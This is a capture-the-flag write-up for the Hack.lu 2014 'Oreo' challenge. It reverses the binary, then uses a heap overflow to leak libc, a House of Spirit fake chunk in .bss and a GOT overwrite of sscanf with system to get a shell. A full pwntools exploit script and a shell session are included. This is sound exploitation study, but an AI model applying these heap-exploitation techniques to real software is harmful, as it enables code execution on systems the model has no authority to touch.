# Hack.lu Oreo

This writeup is based off of this awesome writeup: https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/

This involves using a heap overflow to get a libc infoleak, followed by using The House of Spirit to allocate a chunk in the bss section of memory, followed by using that chunk to overwrite a ptr to the got address of scanf, which then has the libc address of system writtent to it, then we call a shell by passing scanf the string `/bin/sh`.

## Reversing

#### Add Rifle

```
int add_rifle()
{
  char *v1; // [sp+18h] [bp-10h]@1
  int stack_canary; // [sp+1Ch] [bp-Ch]@1

  stack_canary = *MK_FP(__GS__, 20);
  v1 = new_ptr;
  new_ptr = (char *)malloc(0x38u);
  if ( new_ptr )
  {
    *((_DWORD *)new_ptr + 13) = v1;
    printf("Rifle name: ");
    fgets(new_ptr + 25, 56, stdin);
    null_terminate(new_ptr + 25);
    printf("Rifle description: ");
    fgets(new_ptr, 56, stdin);
    null_terminate(new_ptr);
    ++new_rifles;
  }
  else
  {
    puts("Something terrible happened!");
  }
  return *MK_FP(__GS__, 20) ^ stack_canary;
}
```

So looking at this function, we can see a couple of things. Firstly that the data for each rifle is stored as a `0x38` (56) byte space. We can also see that we have the abillity to scan in `56` bytes worth of data into the space for the gun heap space twice, both at offsets `0x0` and `0x19` . It is clear here that we have an overflow. In addition to that, we can see that at offset `13 * 4 = 52`, a pointer to the previous gun is placed there. So using the overflow bug, we can overwrite the previous pointer. Just for review, here is the gun heap chunk:

```
0x0:	Rifle Description Stored, 56 bytes, can overflow Rifle name
0x19:	Rifle Name Stored, 56 bytes, can overflow Prev Rifle Ptr
0x34:	Pointer (Ptr) to previous rifle chunk
```
#### Show Rifles

```
int show_rifles()
{
  char *i; // [sp+14h] [bp-14h]@1
  int v2; // [sp+1Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  printf("Rifle to be ordered:\n%s\n", "===================================");
  for ( i = new_ptr; i; i = (char *)*((_DWORD *)i + 13) )
  {
    printf("Name: %s\n", i + 25);
    printf("Description: %s\n", i);
    puts("===================================");
  }
  return *MK_FP(__GS__, 20) ^ v2;
}
```

So we can see here that it iterates through all of the functions which haven't been ordered yet using the `previous_rifle_ptr`.  It prints the `previous_rifle_ptr` as a char array, followed by `previous_rifle_ptr + 25` (which is where the Description and the name should be). If we can overwrite the `previous_rifle_ptr` (which we can), we should be able to get an infoleak.

#### Order Rifles
```
int order_rifles()
{
  char *ptr; // ST18_4@3
  char *new_ptr_pass; // [sp+14h] [bp-14h]@1
  int v3; // [sp+1Ch] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  new_ptr_pass = new_ptr;
  if ( new_rifles )
  {
    while ( new_ptr_pass )
    {
      ptr = new_ptr_pass;
      new_ptr_pass = (char *)*((_DWORD *)new_ptr_pass + 13);
      free(ptr);
    }
    new_ptr = 0;
    ++rifles_ordered;
    puts("Okay order submitted!");
  }
  else
  {
    puts("No rifles to be ordered!");
  }
  return *MK_FP(__GS__, 20) ^ v3;
}
```

So here we can see is where the allocated heap chunks get freed. Essentially what it does is it first frees last allocated chunk, then loops through all of the other guns that haven't been free using the `previous_rifle_ptr`. In addition to that, we can see that the only pointer it ever zeroes out is `new_ptr` (which is the last pointer allocated) so we have some stale pointers here (not sure how useful they will be).

#### Leave a Message
```
int leave_message()
{
  int v0; // ST1C_4@1

  v0 = *MK_FP(__GS__, 20);
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(message_storage_ptr, 128, stdin);
  null_terminate(message_storage_ptr);
  return *MK_FP(__GS__, 20) ^ v0;
}
```

Here we can see the functionallity for us to leave a message. Essentially it just scans in 128 bytes of data into the area pointed to by `message_storage_ptr` (which is also in the bss). After that it runs our input through a custom function to null terminate it.
#### Show current status

```
int show_status()
{
  int v1; // [sp+1Ch] [bp-Ch]@1

  v1 = *MK_FP(__GS__, 20);
  puts("======= Status =======");
  printf("New:    %u times\n", new_rifles);
  printf("Orders: %u times\n", rifles_ordered);
  if ( *message_storage_ptr )
    printf("Order Message: %s\n", message_storage_ptr);
  puts("======================");
  return *MK_FP(__GS__, 20) ^ v1;
}
```

So here is a function which will just display the numble of new and ordered rifles (as unsigned integers), which is followed by the order message.

#### BSS

```
.bss:0804A288 ; char *new_ptr
.bss:0804A288 new_ptr         dd ?                    ; DATA XREF: add_rifle+11r
.bss:0804A288                                         ; add_rifle+25w ...
.bss:0804A28C                 align 20h
.bss:0804A2A0 rifles_ordered  dd ?                    ; DATA XREF: order_rifles+5Ar
.bss:0804A2A0                                         ; order_rifles+62w ...
.bss:0804A2A4 new_rifles      dd ?                    ; DATA XREF: add_rifle+C5r
.bss:0804A2A4                                         ; add_rifle+CDw ...
.bss:0804A2A8 ; char *message_storage_ptr
.bss:0804A2A8 message_storage_ptr dd ?                ; DATA XREF: leave_message+23r
.bss:0804A2A8                                         ; leave_message+3Cr ...
.bss:0804A2AC                 align 20h
.bss:0804A2C0 message_storage db 80h dup(?)           ; DATA XREF: main+29o
.bss:0804A2C0 _bss            ends
.bss:0804A2C0
```

Here is a segment of the bss section (it is really important to the exploit, so I though it would be important). Here we can see the char pointer `message_storage_ptr` which points to the char array `message_storage`, the integer which holds the value for all of the rifles added `new_rifles`, and the pointer which points to the last allocated rifle `new_ptr `.

## Exploit

#### Infoleak

Starting off we will need an infoleak to break aslr in. To do this, we can make a gun object, and overflow the `previous-rifle-ptr` value with that of the `got` address of `puts`. That way after we do the overflow we can go ahead and show the added rifles. It will first print out the rifle we added, then since the `previous-rifle-ptr` is set to a valid address (the `got` address of `puts`) it will go ahead and print out the libc address of `puts` in the description of the second gun. Then we can just scan in the data it outputs, parse out the first four bytes of data, convert it over to an integer, and we will have the address of `puts`. Proceeding that, we can just subtract the `puts` offset from the libc base, and we will have the base of libc. Proceeding that we can just add the offset for `system` to the libc base, and we will have the address of `system`.

#### House of Spirit

This next part will involve using a technique known as The House of Spirit. Essentially it will involve us writing two integers to an area we control (it will be in the bss global variables section) to make two fake chunks, overwriting a pointer to that area (it will be a `previous-rifle-ptr` that we overwrite) to the  first fake chunk, freeing that fake chunk, then allocating that space as a heap chunk using malloc.

First we have to write the two integers to make the two fake chunks. These two integers will essentially server as the `size` value for the fake chunks (and will be the only values we need to write the fake chunks). The first chunk will start at `0x804a2a0` (with the content for that chunk starting at `0x804a2a8`). The second chunk will start at `0x804a2e0` (with the content for that chunk starting at `0x804a2e8`). The size for our first chunk will be stroed at `0x804a2a4`, and the size for the second chunk will be stored at `0x804a2e4`. The reason why we picked the location of the first chunk, is because the global variables integer `new_rifles` is stored at that address, and we can increase the value of that integer by adding more guns (thus we can write to it). In addition to that, for the start of the content section of that chunk `0x804a2a8`, it matches up with the ptr `message_storage_ptr` which will allow us to overwrite a ptr that we write to with anything that we want. We can overwrite that with the got address for `scanf`, then we can overwrite the address stored in got for `scanf` with `system`, that way when the program calls `scanf`, it will call `system`.

The reason why we choose the location of the second fake chunk, is because that data section lies in `message_storage`, which is a char array stored in the bss, which `message_storage_ptr` points to by default. So we can just write over anything between `0x804a2c0` - `0x804a340` using the `leave_message` function (provided we haven't broken anything yet). The reason why that exact location, is it is `0x40` bytes away from our first chunk (also it's close to the size allocated for a gun), which is a reasonable size chunk for what we want to do (there is a bit of slack there in terms of the exact size for the first chunk, as long as the size we put is the distance from the start of the first chunk to the second chunk). In addition to that for the second chunk, it needs to be in a set range to pass the checks in free (checkout https://github.com/guyinatuxedo/ctf/tree/master/shellphish_heap/house-of-spirit for more on this particluar thing).

So summarizing how we are going to do this:

```
0.)	Add and free 0x3f rifles. This will change the value of new_rifles to 0x40 because 0x3f + 1 = 0x40, and we already added a rifle due to the infoleak
1.)	Add another rifle, overflow the value of previous-rifle-ptr to 0x804a2a8 (the address of the first fake chunk). This will increment the value of new_rifles to 0x41
2.)	Leave a message which will overflow the size of the second fake chunk at 0x804a2e4 to 0x41
3.)	Free the fake chunk by ordering the rifles. This will add our fake chunk to the fastbin list
4.)	Allocate a chunk with the content section starting at 0x804a2a8, from the fastbin list, put the description to be the got address of scanf
```

#### Overwrite Scanf

So with the previous House of Spirit technique, we have effictively overwrittent the ptr at `0x804a2a8` (`message_storage_ptr`) with that of the got address of `scanf`, and we also have an infoleak so we know where all of libc is, we can just write to the got address of `scanf` with the libc address of `system`. Proceeding that we can just get a shell by inputting the string `/bin/sh` when it prompts us for an action, since it first scans it into memory as a char array, then passes it to scanf as a char pointer (which is the argument which system takes).

#### Written Exploit

Putting it all together, we have the following exploit:
```
# This exploit is based off of https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/

from pwn import *

target = process('./oreo', env={"LD_PRELOAD":"/lib32/libc-2.24.so"})
gdb.attach(target)
elf = ELF('oreo')
libc = ELF("/lib32/libc-2.24.so")

def addRifle(name, desc):
#	print target.recvuntil("Action:")
	target.sendline('1')
#	print target.recvuntil("Rifle name: ")
	target.sendline(name)
#	print target.recvuntil("Rifle description: ")
	target.sendline(desc)

def leakLibc():
	target.sendline('2')
	print target.recvuntil("Description: ")
	print target.recvuntil("Description: ")
	leak = target.recvline()
	puts = u32(leak[0:4])
	libc_base = puts - libc.symbols['puts']
	return libc_base
def orderRifles():
	target.sendline("3")

def leaveMessage(content):
	target.sendline("4")
	target.sendline(content)
#def currentStats():

# First commence the initial overflow of the previous gun ptr with the got address of puts for the infoleak
addRifle('0'*0x1b + p32(elf.got['puts']), "15935728")

# Show the guns, scan in and parse out the infoleak, figure out the base of libc, and figure out where system is
libc_base = leakLibc()
system = libc_base + libc.symbols['system']
log.info("System is: " + hex(system))

# Iterate through 0x3f cycles of adding then freeing that rifle, to increment new_rifles to 0x40. Also we need to overwrite the value of previous_rifle_ptr with 0x0, so the free check won't do anything (and the program won't crash)
for i in xrange(0x3f):
	addRifle("1"*0x1b + p32(0x0), "1593")
	orderRifles()

# Add a rifle to overwrite the previous_rifle_ptr to the address of messafe_storage_ptr 0x804a2a8 
addRifle("1"*0x1b + p32(0x804a2a8), "15935728")

# Write the size value of the second fake chunk by leaving a message
leaveMessage(p32(0)*9 + p32(0x41))

# Free the fake chunk
orderRifles()

# Allocate a new chunk of heap, which will allow us to write over 0x804a2a8 which is messafe_storage_ptr with the got address of scanf
addRifle("15935728", p32(elf.got['__isoc99_sscanf']))

# Write over the value stored in the got address of scanf with the libc address of system which we got from the infoleak
leaveMessage(p32(system))

# Send the string /bin/sh which will get scanned into memory with fgets, then passed to system (supposed to be passed to scanf)
target.sendline("/bin/sh")

# Drop to an interactive shell
target.interactive()

# This exploit is based off of https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/
```

when we run it:
```
$	python exploit.py

.	.	.

$ w
ERROR: ld.so: object '/lib32/libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
 00:54:23 up 14:21,  1 user,  load average: 0.37, 0.44, 0.50
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               Mon11   13:36m  7:39   0.02s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
ERROR: ld.so: object '/lib32/libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
Add-memo   delete-memo    oreo               readme.md
Edit-memo  exploit.py    peda-session-oreo.txt       solved.py
core       leak.py    peda-session-w.procps.txt
```

Just like that, we popped a shell!

Once again this writeup is based off of this other great writeup: https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/
